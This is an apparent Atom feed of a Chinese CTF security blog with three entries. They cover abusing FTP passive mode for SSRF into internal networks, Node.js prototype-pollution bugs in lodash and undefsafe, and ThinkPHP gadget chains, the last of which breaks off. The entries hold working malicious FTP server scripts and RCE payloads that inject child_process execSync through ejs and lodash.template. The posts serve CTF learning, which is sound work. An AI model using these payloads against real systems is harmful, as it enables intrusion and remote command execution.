<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>npC4t&#39;s Blog</title>
  
  
  <link href="https://123-prog.github.io/atom.xml" rel="self"/>
  
  <link href="https://123-prog.github.io/"/>
  <updated>2021-10-04T15:38:01.502Z</updated>
  <id>https://123-prog.github.io/</id>
  
  <author>
    <name>npC4t</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中ftp协议的利用</title>
    <link href="https://123-prog.github.io/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>https://123-prog.github.io/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2021-10-04T09:54:12.000Z</published>
    <updated>2021-10-04T15:38:01.502Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ftp协议简单介绍"><a href="#ftp协议简单介绍" class="headerlink" title="ftp协议简单介绍"></a>ftp协议简单介绍</h3><a id="more"></a><p>跟http协议一样，它也是一个文本协议，用于在客户端和服务端之间传输数据，它拥有自己的控制命令，客户端发送指定命令到服务端，服务端返回相应的状态码和信息；</p><p>ftp默认端口两个，20和21，其中20用于传输数据，21用于传输控制信息；</p><p>看一个例子</p><p><img src="/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/Snipaste_2021-10-04_18-02-12.png"></p><p>这是我用vsftpd服务抓的一个包，可以看到ftp服务端和客户端之间的交互就是简单的文本命令</p><p>各种命令和状态码代表的意义参考<a href="https://www.iteye.com/blog/justcoding-835002">https://www.iteye.com/blog/justcoding-835002</a></p><h3 id="ftp的被动模式"><a href="#ftp的被动模式" class="headerlink" title="ftp的被动模式"></a>ftp的被动模式</h3><p>CTF中最多利用的就是ftp的被动模式，ftp传输数据的方式分为主动模式port和被动模式pasv，主动和被动的对象是服务端，主动即传输数据时，服务端主动去连接客户端的某个端口，用创建的这个连接来传输数据，被动模式即服务端给客户端提供一个端口，让客户端发起连接，这个过程，服务端处于被动连接状态，所以叫被动模式</p><p>被动模式的利用很简单，被动模式的服务端不仅可以指定客户端连接的端口，还可以指定客户端连接的地址，如果我们将这个地址指定为127.0.0.1，即客户端本地，客户端就会将数据送至本地某个端口，即可成功将数据送进内网，攻击内网中其他应用</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>CTF中，常见的就是在vps上搭恶意ftp服务器，用于转发数据进内网完成攻击</p><p>简单实现ftp服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   <span class="comment">#创建tcp socket</span></span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">23</span>)) </span><br><span class="line">s.listen(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 \n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"><span class="comment">#SIZE /aaa\r\n</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"><span class="comment">#EPSV\r\n</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) </span><br><span class="line"><span class="comment">#PASV\r\n</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 127,0,0,1,0,9001\n&#x27;</span>)   <span class="comment">#0*256+9001</span></span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>除此之外，还有一种情况，实例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>利用方式有一点差别，同样利用ftp协议，第一次连接我们需要将payload发送给$data，第二次连接同上被动模式，将$data送到指定服务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment">#创建tcp socket</span></span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">2000</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">so = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment">#用于传输数据</span></span><br><span class="line"></span><br><span class="line">so.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">2001</span>))</span><br><span class="line">so.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">counts = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> counts == <span class="number">1</span>:</span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)  </span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;USER anonymous\r\n&#x27;n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;230 login successful.\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;TYPE I\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;SIZE /aaa\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;213 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;EPSV\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;PASV\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;227 127,0,0,1,0,2001\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) </span><br><span class="line"></span><br><span class="line">        conn.send(<span class="string">b&#x27;150 \n&#x27;</span>) <span class="comment">#告诉客户端数据连接已经准备好了，可以开始传输</span></span><br><span class="line">        conn2,addr2 = so.accept()  <span class="comment">#新建连接，传输数据</span></span><br><span class="line">        conn2.send(payload)  <span class="comment">#这里发送payload</span></span><br><span class="line">        conn2.close()</span><br><span class="line">        conn.send(<span class="string">b&#x27;226 \n&#x27;</span>) <span class="comment">#告诉客户端数据已经传输完成</span></span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line">        conn.send(<span class="string">b&#x27;220 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#SIZE /aaa\r\n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#EPSV\r\n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#PASV\r\n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;227 127,0,0,1,0,9001\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">        conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">    counts += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>有时候可能靶机没有出网，就连接不了我们构造的恶意ftp服务，但如果能拿到webshell的话，例如php的shell，我们依旧可以利用shell在靶机本地起我们的恶意ftp服务，附上ftp服务器php版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$socket</span> = stream_socket_server(<span class="string">&quot;tcp://0.0.0.0:2000&quot;</span>,<span class="variable">$errno</span>,<span class="variable">$err</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$socket</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$errno</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$err</span>.<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$conn</span> = stream_socket_accept(<span class="variable">$socket</span>))&#123;</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;220 \n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;230 Login successful.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;200 \n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;550 Could not get the file size.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;200 \n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;227 127,0,0,1,0,9000\n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;150 Permission denied.\n&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;221 Goodbye.\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$conn</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$socket</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;ftp协议简单介绍&quot;&gt;&lt;a href=&quot;#ftp协议简单介绍&quot; class=&quot;headerlink&quot; title=&quot;ftp协议简单介绍&quot;&gt;&lt;/a&gt;ftp协议简单介绍&lt;/h3&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="other" scheme="https://123-prog.github.io/categories/CTF/other/"/>
    
    
    <category term="ftp协议" scheme="https://123-prog.github.io/tags/ftp%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>nodejs原型链污染</title>
    <link href="https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2021-10-03T02:29:52.000Z</published>
    <updated>2021-10-03T14:50:37.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="触发污染点"><a href="#触发污染点" class="headerlink" title="触发污染点"></a>触发污染点</h2><h3 id="0x01-lodash-defaultsDeep方法造成的原型链污染"><a href="#0x01-lodash-defaultsDeep方法造成的原型链污染" class="headerlink" title="0x01 lodash.defaultsDeep方法造成的原型链污染"></a>0x01 lodash.defaultsDeep方法造成的原型链污染</h3><a id="more"></a><p>影响lodash&lt;4.17.12所有版本，4.17.12之后修复，除了原本过滤的<code>__proto__</code>，新增过滤了<code>constructor</code>以防止污染全局对象</p><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_13-59-07.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).defaultsDeep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;hack&quot;:&quot;whoami&quot;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">merge(&#123;&#125;,<span class="built_in">JSON</span>.parse(payload));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;sss&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="0x02-lodash-merge，lodash-mergeWith"><a href="#0x02-lodash-merge，lodash-mergeWith" class="headerlink" title="0x02 lodash.merge，lodash.mergeWith"></a>0x02 lodash.merge，lodash.mergeWith</h3><p>lodash&lt;4.17.5</p><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_15-03-06.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">lodash.merge(&#123;&#125;,<span class="built_in">JSON</span>.parse(payload));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="0x03-lodash-set-，lodash-setWith"><a href="#0x03-lodash-set-，lodash-setWith" class="headerlink" title="0x03 lodash.set ，lodash.setWith"></a>0x03 lodash.set ，lodash.setWith</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set(object, path, value)</span><br></pre></td></tr></table></figure><p>用于设置值到对象对于的属性路径上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123; <span class="string">&#x27;a&#x27;</span>: [&#123; <span class="string">&#x27;b&#x27;</span>: &#123; <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span> &#125; &#125;] &#125;;</span><br><span class="line"></span><br><span class="line">_.set(object, <span class="string">&#x27;a[0].b.c&#x27;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(object.a[<span class="number">0</span>].b.c);</span><br><span class="line"><span class="comment">// =&gt; 4</span></span><br><span class="line"></span><br><span class="line">_.set(object, <span class="string">&#x27;x[0].y.z&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(object.x[<span class="number">0</span>].y.z);</span><br><span class="line"><span class="comment">// =&gt; 5</span></span><br></pre></td></tr></table></figure><p>如果没有对传入的参数进行过滤，则可能造成原型链污染</p><p>例如</p><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_15-26-52.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;<span class="string">&#x27;a&#x27;</span>:[&#123;<span class="string">&#x27;b&#x27;</span>:&#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;&#125;]&#125;;</span><br><span class="line"></span><br><span class="line">lodash.set(object,<span class="string">&#x27;__proto__.hack&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="0x04-Undefsafe模块原型链污染"><a href="#0x04-Undefsafe模块原型链污染" class="headerlink" title="0x04 Undefsafe模块原型链污染"></a>0x04 Undefsafe模块原型链污染</h3><p>用于处理访问对象属性不存在的报错问题，在版本小于2.0.3中存在原型链污染漏洞</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(undef(object,<span class="string">&#x27;c&#x27;</span>));</span><br><span class="line"><span class="comment">//undefine,c属性不存在</span></span><br><span class="line">undef(object,<span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(object)</span><br><span class="line"><span class="comment">//覆盖类属性值，存在的话，修改，不存在，创建，这里创建了一个属性c，可以利用这一点污染原型链</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_15-51-23.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object=&#123;&#125;</span><br><span class="line"></span><br><span class="line">undef(object,<span class="string">&#x27;__proto__.hack&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="0x01-污染ejs实现rce"><a href="#0x01-污染ejs实现rce" class="headerlink" title="0x01 污染ejs实现rce"></a>0x01 污染ejs实现rce</h3><p>利用点：</p><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_11-32-44.png"></p><p>可以看到<code>opts.outputFunctionName</code>此时是undefined，利用原型链污染这个变量，可实现代码注入</p><p>例如构造代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a;<span class="keyword">return</span> <span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;whoami&#x27;</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>便可以实现rce</p><p>简单merge操作的污染payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-利用lodash-template实现RCE"><a href="#0x02-利用lodash-template实现RCE" class="headerlink" title="0x02 利用lodash.template实现RCE"></a>0x02 利用lodash.template实现RCE</h3><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_16-36-54.png"></p><p>污染options.sourceURL即可注入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;sourceURL&quot;</span>:<span class="string">&quot;\nreturn global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到flag自动删除污染的sourceURL</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;sourceURL&quot;</span>:<span class="string">&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\n//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_16-53-01.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;触发污染点&quot;&gt;&lt;a href=&quot;#触发污染点&quot; class=&quot;headerlink&quot; title=&quot;触发污染点&quot;&gt;&lt;/a&gt;触发污染点&lt;/h2&gt;&lt;h3 id=&quot;0x01-lodash-defaultsDeep方法造成的原型链污染&quot;&gt;&lt;a href=&quot;#0x01-lodash-defaultsDeep方法造成的原型链污染&quot; class=&quot;headerlink&quot; title=&quot;0x01 lodash.defaultsDeep方法造成的原型链污染&quot;&gt;&lt;/a&gt;0x01 lodash.defaultsDeep方法造成的原型链污染&lt;/h3&gt;</summary>
    
    
    
    <category term="其他" scheme="https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="原型链污染" scheme="https://123-prog.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>gadgetchains</title>
    <link href="https://123-prog.github.io/2021/09/26/gadgetchains/"/>
    <id>https://123-prog.github.io/2021/09/26/gadgetchains/</id>
    <published>2021-09-26T09:23:46.000Z</published>
    <updated>2021-10-03T14:46:21.801Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-thinkphp-5-0-4-5-0-24"><a href="#0x01-thinkphp-5-0-4-5-0-24" class="headerlink" title="0x01 thinkphp 5.0.4~5.0.24"></a>0x01 thinkphp 5.0.4~5.0.24</h3><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 